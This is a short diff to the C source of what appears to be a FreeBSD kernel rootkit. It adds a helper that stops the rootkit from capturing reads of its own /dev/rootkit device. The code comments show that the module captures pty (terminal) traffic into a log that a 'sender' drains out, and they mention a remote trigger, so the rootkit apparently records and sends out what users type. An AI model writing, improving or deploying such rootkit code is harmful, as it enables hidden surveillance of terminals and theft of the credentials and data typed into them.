@@ -10,6 +10,7 @@
 #include <sys/systm.h>
 #include <sys/ucred.h>
 #include <sys/uio.h>
+#include <sys/vnode.h>
 #include <sys/condvar.h>
 #include <netinet/in.h>
 
@@ -17,6 +18,22 @@
 #include "log.h"
 
 static struct cdev *rootkit_dev;
+
+/*
+ * A read() on our own cdev must never be captured: the sender drains the log
+ * through /dev/rootkit, so feeding those bytes back into the ring is a loop
+ * that fills the buffer with its own output within a second. The device is a
+ * character vnode exactly like a pty slave, so the descriptor type alone
+ * cannot tell them apart -- the rdev can.
+ */
+int
+rootkit_is_our_vnode(struct vnode *vp)
+{
+
+	if (rootkit_dev == NULL || vp == NULL)
+		return (0);
+	return (vp->v_rdev == rootkit_dev);
+}
 
 /* Global synchronization primitives defined in module for remote trigger */
 extern struct cv remote_cv;
